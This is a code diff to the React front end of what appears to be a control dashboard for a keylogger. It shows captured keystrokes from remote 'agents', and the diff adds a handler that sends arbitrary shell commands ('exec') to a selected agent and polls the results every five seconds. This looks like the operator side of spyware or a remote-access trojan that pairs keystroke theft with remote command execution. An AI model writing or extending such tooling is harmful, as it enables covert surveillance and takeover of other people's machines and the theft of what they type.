@@ -4,8 +4,8 @@ import { TopBar } from "./components/TopBar";
 import { FooterBar } from "./components/FooterBar";
 import { KeystrokeFeed } from "./components/KeystrokeFeed";
 import { AgentDetailPanel } from "./components/AgentDetailPanel";
-import type { Agent, KeystrokeEntry, HourlyActivity } from "./types";
-import { api, mapApiAgentToUi, bufferKeystrokes } from "./services/api";
+import type { Agent, KeystrokeEntry, HourlyActivity, ApiCommandResult, CommandResult } from "./types";
+import { api, mapApiAgentToUi, bufferKeystrokes, mapApiCommandResultToUi } from "./services/api";
 import { usePolling } from "./hooks/usePolling";
 
 export default function App() {
@@ -13,6 +13,7 @@ export default function App() {
   const [activeView, setActiveView] = useState<"feed" | "detail">("feed");
   const [searchQuery, setSearchQuery] = useState("");
   const [allEntries, setAllEntries] = useState<KeystrokeEntry[]>([]);
+  const [commandResults, setCommandResults] = useState<CommandResult[]>([]);
   const lastSeenTimestamp = useRef<string | null>(null);
 
   /* ── API polling ── */
@@ -44,6 +45,19 @@ export default function App() {
   const { data: apiActivity } = usePolling(
     activityFetcher,
     30_000,
+    activeView === "detail" && !!selectedAgentId
+  );
+
+  const commandFetcher = useCallback(
+    () =>
+      selectedAgentId
+        ? api.getAgentCommands(selectedAgentId, 20)
+        : Promise.resolve([] as ApiCommandResult[]),
+    [selectedAgentId]
+  );
+  const { data: apiCommandResults } = usePolling(
+    commandFetcher,
+    5_000,
     activeView === "detail" && !!selectedAgentId
   );
 
@@ -95,11 +109,22 @@ export default function App() {
     return [];
   }, [apiActivity, agents, selectedAgentId]);
 
+  /* sync command results */
+  useEffect(() => {
+    if (!apiCommandResults) return;
+    setCommandResults(apiCommandResults.map(mapApiCommandResultToUi));
+  }, [apiCommandResults]);
+
   /* ── Handlers ── */
 
   const handleSelectAgent = (id: string) => {
     setSelectedAgentId(id);
     setActiveView("detail");
+  };
+
+  const handleSendCommand = (cmd: string) => {
+    if (!selectedAgentId) return;
+    api.sendAgentAction(selectedAgentId, "exec", { cmd }).catch(() => {});
   };
 
   const handleDeleteAgent = async (id: string) => {
@@ -152,7 +177,9 @@ export default function App() {
               agent={selectedAgent}
               entries={allEntries}
               activityData={activityData24h}
+              commandResults={commandResults}
               onDelete={handleDeleteAgent}
+              onSendCommand={handleSendCommand}
               latestVersion={latestVersion}
             />
           )}
